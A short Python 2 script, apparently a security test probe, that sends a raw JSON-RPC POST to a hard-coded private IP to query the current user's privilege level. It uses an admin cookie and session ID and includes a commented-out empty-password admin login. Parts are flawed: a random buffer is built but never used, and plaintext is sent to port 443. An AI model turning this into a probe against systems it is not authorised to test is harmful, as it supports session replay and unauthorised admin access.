#!/usr/bin/python
# send a POST/ data to an ip address/port
import socket, sys
import random

def create_attack():
    buf = ''
    num = random.randrange(25,101)

    for i in range(num):
        alpha = random.randrange(7,127)
        buf += chr(alpha)

    buffer ="POST https://10.219.101.161/jsonrpc/get_value HTTP/1.0\r\n"
    buffer += "Host: 10.219.101.161\r\n"
    buffer += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)\r\n"
    buffer += "Pragma: no-cache\r\n"
    buffer += "X-Requested-With: XMLHttpRequest\r\n"
    buffer += "Referrer: https://10.219.101.161/index.html\r\n"
    buffer += "Cookie: testme=cookie; uid=admin; sessid_443=sess5CeHMY7jf/ecTE00MNCzgA==\r\n\r\n"
    buffer += '{"jsonrpc": "2.0","id": 3,"method": "get_value","params":{"th": "th","path": "/users:users/current_user/privlevel"}}\r\n'

    # buffer = 'POST /jsonrpc/login HTTP/1.0\r\n'
    # buffer += 'Host: 10.219.101.161\r\n'
    # buffer += 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)\r\n'
    # buffer += 'Pragma: no-cache\r\n'
    # buffer += 'Referer: https://10.219.101.161/login.html\r\n'
    # buffer += 'Cookie: testme=cookie; uid=admin\r\n'
    # buffer += 'Connection: keep-alive\r\n\r\n'

    #buffer += '{"jsronrpc":"2.0","id":1,"method":"login","params":{"user":"admin","passwd":""}}'
    print(buffer)
    return buffer

def send_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("10.219.101.161",443))
    sock.send(create_attack())
    sock.close()

send_attack()
